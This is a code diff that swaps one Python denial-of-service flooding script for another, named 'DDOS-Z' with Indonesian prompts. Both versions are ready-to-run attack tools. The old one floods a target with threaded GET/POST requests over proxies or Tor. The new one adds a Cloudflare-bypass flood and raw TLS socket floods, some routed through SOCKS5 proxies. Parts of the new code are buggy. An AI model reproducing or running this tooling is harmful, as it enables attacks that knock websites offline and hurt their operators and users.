@@ -1,194 +1,197 @@
-#!/usr/bin/env python
-# -*- encoding: UTF-8 -*-
+# -*- coding: utf-8 -*-
+from os import system, name
+import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
+from urllib.parse import urlparse
+from requests.cookies import RequestsCookieJar
+import undetected_chromedriver as webdriver
+from sys import stdout
+from colorama import Fore, init
 
-import os
-import sys
-import random
-import re
-import requests
-import threading
-import time
-import argparse
-try:
-    from arts import Header
-# Now you can use Header
+def clear(): 
+    if name == 'nt': 
+        system('cls')
+    else: 
+        system('clear')
 
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.RED+">>>"+Fore.WHITE+" Proses => " + str((until - datetime.datetime.now()).total_seconds()) + " sisa waktu ")
+        else:
+            stdout.flush()
+            stdout.write("\r"+Fore.RED+">>>"+Fore.WHITE+" SELESAI "+Fore.RED+"<<<                                    \n")
+            return
 
-config = {}     # Stores de configuration provided by the user
-success = 0     # Count of the amount of packets successfully send
-stop = False    # If True stop all threads
-user_agents = [
-    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
-    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
-    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
-    "Opera/9.20 (Windows NT 6.0; U; en)",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-]
+def get_info_l7():
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"URL      "+Fore.RED+": "+Fore.WHITE)
+    target = input()
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"Thread   "+Fore.RED+": "+Fore.WHITE)
+    thread = input()
+    stdout.write(""+Fore.RED+">>"+Fore.WHITE+"TIME     "+Fore.RED+": "+Fore.WHITE)
+    t = input()
+    return target, thread, t
 
-class thread(threading.Thread):
-    def __init__(self, config):
-        threading.Thread.__init__(self)
-        self.url = config["url"]
-        self.proxy = config["proxy"]
-        self.on = not stop
-        self.config = config
+def get_info_l4():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    port = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, port, thread, t
 
-    def set_headers(self):
-        return {'user-agent': self.config["user_agent"] if self.config["user_agent"] else random.choice(user_agents)}
-    def count_packets(self):
-        global success
-        success += 1
+def title():
+    system('clear')
+    stdout.write("                                    \n")
+    stdout.write("\n")
+    stdout.write(""+Fore.RED   +">>>>>  WELCOME    TO    DDOS-Z  <<<<<\n")
+    stdout.write("\n")
+    stdout.write(""+Fore.GREEN+"Pilih Metode (cfb)  or  (sky)\n")
+    stdout.write(""+Fore.RED+">>> PASTIKAN TERHUBUNG INTERNET <<<\n")
+    stdout.write("\n")
+##############################################################################################
+def command():
+    stdout.write(Fore.RED+"╔═══"+Fore.RED+"["""+Fore.RED+""+Fore.RED+"DDOS-Z"+Fore.RED+"]"+Fore.RED+"\n╚══> "+Fore.WHITE)
+    command = input()
+    if command == "cls" or command == "clear" or command == "Clear" or command == "CLEAR":
+        clear()
+        title()
+    elif command == "cfb" or command == "CFB":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    elif command == "sky" or command == "SKY" or command == "Sky":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    elif command == "exit" or command == "Exit" or command == "EXIT":
+        exit()
 
-class Get(thread):
-    def __init__(self,config):
-        super().__init__(config)
-
-    def http_get(self):                 # Change session to previous
-
+#region CFB
+def LaunchCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
         try:
-            r = requests.get(self.url, headers=self.set_headers(), proxies=self.proxy)
-            self.count_packets()  if r.status_code == 200 else None
-        except requests.exceptions.RequestException as e:
-            print("Error: {}".format(e))
-    def run(self):
-        while self.on:
-            self.http_get()
-            self.on = not stop
-            time.sleep(0.01)
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
 
-class Post(thread):
-    def __init__(self,config):
-        super().__init__(config)
-
-    def http_post(self):
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            p = requests.post(self.url, data = generate_data(100), headers = self.set_headers(), proxies = self.proxy)
-            self.count_packets() if p.status_code == requests.codes.ok else None
-        except requests.exceptions.RequestException as e:
-            print("Error: {}".format(e))
-    def run(self):
-        while self.on:
-            self.http_post()
-            self.on = not stop
-            time.sleep(0.01)
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+        except:
+            pass
+#endregion       
+                        
+#region testzone
+def attackSKY(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSKY, args=(url, timer)).start()
 
-class Checker(thread):
-    def __init__(self, config, sleep=None):
-        super().__init__(config)
-        self.sleep = sleep if sleep else 10
+def LaunchSKY(url, timer):
+    proxy = random.choice(proxies).strip().split(":")
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+def attackSTELLAR(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
 
-    def run(self):
-        while(self.on):
-            stop = not check_address(self.url)
-            time.sleep(self.sleep)
-            self.on = not stop
-
-def parse_address(url):
-    url_format = "(http|https)|\://"
-    link_format = "^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(/\S*)?$"
-    if re.match(url_format + link_format, url):
-        return url
-    elif re.match(link_format, url):
-        return "http://%s" % url
-    elif "://" in url:
-        return "http:"+url.split(":")[1]
+def LaunchSTELLAR(url, timer):
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.create_default_context()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+#endregion
+if __name__ == '__main__':
+    init(convert=True)
+    if len(sys.argv) < 2:
+        ua = open('./resources/ua.txt', 'r').read().split('\n')
+        title()
+        while True:
+            command()
+    elif len(sys.argv) == 5:
+        pass
     else:
-        print("[!] Url format is incorrect [!]")
-        exit(0)
-
-def parse_proxy(proxy):
-    if proxy == "tor":
-        proxy = "socks5://127.0.0.1:9050"
-    elif re.match("(.*:)?.*@.*|.*:.*", proxy):
-        proxy = 'http://'+proxy
-    return {'http': proxy, 'https': proxy}
-def check_address(url):
-    # Check if the provided target is up
-    try:
-        req = requests.get(url)
-        return req.status_code == requests.codes.ok
-    except ConnectionError:
-        print("Connection error")
-        return False
-
-def generate_data(leng): 
-    # This is used to generate data randomly 
-    chars = ["!", "@", "-", "`", ";", "^", "+", "*"]
-    msg = ""
-    c = 0
-    while (len(msg)<leng):
-        msg = msg + random.choice(chars)+str(c)
-        c+=1
-    return msg
-
-def get_parser():
-    # Creates a configuration dictionary based on the parameters we gave
-    parser = argparse.ArgumentParser(description='OverHead2 DoS script.')
-    parser.add_argument('-u', '--url', help='Set an IP or URL as target', type=str)
-    parser.add_argument('-t', '--threads', help='Set the number of threads to be created', type=int, default=100)
-    parser.add_argument('-p', '--proxy', help='Use proxy. Type tor to use tor as proxy', type=str)
-    parser.add_argument('-A', '--user-agent', help='Set a custom User Agent',type=str)
-    parser.add_argument('--get', '--GET', help='Perform the attack with HTTP GET', action='store_true')
-    parser.add_argument('--post', '--POST', help='Perform the attack with HTTP POST', action='store_true')
-    return parser
-def check_input(config):
-    # Check and manipulate the inputs
-    if not config["url"]:
-        print('[!]  You must specify a Target  [!]')
-        exit(0)
-    config["url"] = parse_address(config["url"])
-    config["type"] = 'POST' if config["post"] else 'GET' if config['get'] else 'GET'
-    if config['post'] and config['get']:
-        print("[!] Invalid options. You cannot use GET and POST at once")
-        exit(0)
-    return config
-
-def main():
-    threads_pool = []                        # Stores all active threads
-    Header()                                 # Prints the header
-    options = get_parser()                   # Get the arguments
-    config = check_input(vars(options.parse_args()))
-
-    # PRINT INFO BANNER
-    status = check_address(config["url"])
-    separator = "#"+"="*40+"#"
-    print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n# Type: {4}\n# Proxy: {5}\n{0}".format(
-        separator,
-        config["url"],
-        config["threads"],
-        "online" if status else "offline",
-        config["type"],
-        config["proxy"]))
-    if not status:
-        exit(0)
-    print("\n> Press enter to launch the attack")
-    input()
-    # START DE ATTACK 
-    starting_time = time.time()
-    for c in range(config["threads"]):
-        t = Get(config) if config["type"] == "GET" else Post(config)
-        threads_pool.append(t)
-        t.start()
-
-    # Starts a new checker thread 
-    checker = Checker(config)
-    checker.start()
-
-    while threading.active_count() > 0:
-        now = round(time.time() -starting_time, 1 )
-        try:
-            print("\r[>] Number of hits: {0}       |   Time: {1}".format(success, now), end="\r")
-        except KeyboardInterrupt:
-            checker.on = False
-            for th in threads_pool:
-                th.on = False
-    print("\n[!] All threads have been stoped")
-    exit(0)
-
-if __name__ == "__main__":
-    main()
+        system('clear')
+        stdout.write(Fore.RED+"ERROR\n")
+        stdout.write("\n")
+        stdout.write(f"masukan command ini : python {sys.argv[0]}\n")
+        stdout.write("\n")
+        sys.exit()
+    ua = open('./resources/ua.txt', 'r').read().split('\n')
+    method = sys.argv[1].rstrip()
+    target = sys.argv[2].rstrip()
+    thread = sys.argv[3].rstrip()
+    t      = sys.argv[4].rstrip()
+    if method == "cfb":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    elif method == "sky":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    else:
+        stdout.write(Fore.RED+"Metode ERROR\nMetode yang tersedia: cfb, sky\n")
